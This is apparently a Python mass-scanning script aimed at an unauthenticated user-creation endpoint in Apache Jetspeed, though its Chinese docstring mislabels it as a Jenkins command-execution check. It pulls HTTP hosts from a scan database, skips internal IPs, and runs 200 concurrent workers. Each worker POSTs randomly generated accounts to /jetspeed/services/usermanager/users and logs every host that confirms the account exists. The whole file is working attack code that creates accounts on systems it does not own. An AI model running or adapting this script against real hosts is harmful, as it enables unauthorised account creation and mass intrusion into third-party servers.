# coding:utf-8
"""
	jenkins 命令执行
"""

from gevent import monkey
from gevent.pool import Pool
from lib.lib import *
import time
import random
from string import ascii_lowercase
import traceback
import logging
logging.getLogger().setLevel(logging.ERROR)
monkey.patch_all()
logpath = "temp/jetspeed_"+time.strftime("%Y-%m-%d_%H:%M", time.localtime(time.time()))
import requests


def randomString(length=8):
    """
    生成随机字母串
    :param length:生成字符串长度
    :return 字母串
    """
    return ''.join([random.choice(ascii_lowercase) for _ in range(length)])


def run(domain,port):
	for suffix in ["/jetspeed/services/usermanager/users/?_type=json"]:
		if str(port) == "443":
			url = "https://{0}:{1}".format(domain, port)
		else:
			url = "http://{0}:{1}".format(domain, port)
		url = url + suffix
		try:
			password = randomString(6)
			username = randomString(6)
			data1 = {
				'name': username,
				'password': password,
				'password_confirm': password,
				'user_name_given': 'foo',
				'user_name_family': 'bar',
				'user_email': 'test@test.net',
				'newrule': ''
			}
			requests.post(url, data=data1, timeout=10, verify=False)
			c = requests.post(url, data=data1, timeout=10, verify=False).content
			if 'PRINCIPAL_ALREADY_EXISTS' in c:
				saveFile(url, logpath)
		except requests.RequestException:
			pass
		except Exception as e:
			traceback.print_exc()
			#print(e, url)

def check(task):
	ip = task[0]
	port = str(task[1])
	if is_internal_ip(ip):
		return
	print("{0} Scanning: {1}".format(time.strftime("%d:%H:%M", time.localtime(time.time())), ip))
	for domain in getdomainfromip(ip):
		if domain == "" or domain.startswith("IPc"):
			continue
		run(domain,port)
"""
	检查结束后
"""
def clean():
	pass
"""
	测试
"""
def test(ip, port):
	check([ip, port])

def main():
	res = get_from_database(
		"select address,port from blog.scan_scan_port where service like 'http%' or service ='' or service='unknown' or port='80'")
	res = list(set(res))
	print("共检查{0}个IP".format(len(res)))
	random.shuffle(res)
	p = Pool(200)
	p.map(check, res)


if __name__ == "__main__":
	print("String...")
	# main()
	print("Finished...")
	clean()
